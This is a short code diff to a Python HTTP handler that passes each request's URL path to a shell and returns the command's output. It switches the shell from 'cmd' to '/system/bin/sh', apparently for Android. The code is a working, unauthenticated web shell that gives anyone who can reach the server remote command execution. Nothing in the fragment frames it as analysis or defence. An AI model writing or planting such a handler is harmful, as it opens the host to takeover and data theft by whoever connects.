@@ -13,7 +13,7 @@ def shellHTTPRequestHandler():
   
             self.send_header('Content-Type', 'text/html')
             self.end_headers()
-            self.wfile.write(subprocess.check_output(['cmd', '-c', parsed_url.path[1:]]))
+            self.wfile.write(subprocess.check_output(['/system/bin/sh', '-c', parsed_url.path[1:]]))
 
     return ShellHTTPRequestHandler
 
